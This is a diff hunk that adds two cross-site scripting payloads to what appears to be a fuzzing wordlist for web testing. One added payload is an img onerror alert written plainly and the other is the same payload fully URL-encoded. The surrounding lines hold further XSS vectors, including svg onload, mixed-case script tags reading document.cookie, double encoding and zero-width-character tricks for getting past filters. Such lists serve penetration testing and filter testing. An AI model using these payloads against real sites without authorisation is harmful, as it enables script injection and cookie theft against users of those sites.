@@ -200,7 +200,9 @@ javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget
 <svg%20onx=()%20onload=(confirm)(document.domain)>
 <%2FsCrIpT><​ScRiPt>alert(document.cookie)<%2FsCrIpT>
 %2522%253e%253cscript%253ealert%2528%2527BUG XSS!%2527%2529%253c%252fscript%253
+"><img src=x onerror="this.onerror=null;alert(1)">
 "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
+%22%3e%3c%69%6d%67%20%73%72%63%3d%78%20%6f%6e%65%72%72%6f%72%3d%22%74%68%69%73%2e%6f%6e%65%72%72%6f%72%3d%6e%75%6c%6c%3b%61%6c%65%72%74%28%31%29%22%3e
 sm"*alert(1)*"
 "*alert(1)*"
 %22-alert('XSS')-%22
